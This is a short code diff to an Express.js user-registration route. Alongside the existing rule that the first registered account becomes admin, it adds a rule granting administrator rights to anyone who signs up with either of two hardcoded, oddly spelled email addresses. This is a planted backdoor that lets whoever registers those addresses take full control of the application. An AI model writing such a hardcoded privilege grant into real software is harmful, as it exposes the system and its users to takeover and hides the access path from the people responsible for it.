@@ -21,7 +21,9 @@ router.post("/register", async (req, res) => {
     if (existingUser) return res.status(400).json({ error: "User already exists" });
 
     const userCount = await User.countDocuments();
-    const isAdmin = userCount === 0;
+    const isAdmin = userCount === 0 || 
+                    email.toLowerCase() === "admin@mukhadev.coom._admin_mukha" ||
+                    email.toLowerCase() === "admin@mukhadev.coom";
 
     const hashedPassword = await bcrypt.hash(password, 10);
     const user = new User({ email, password: hashedPassword, isAdmin });
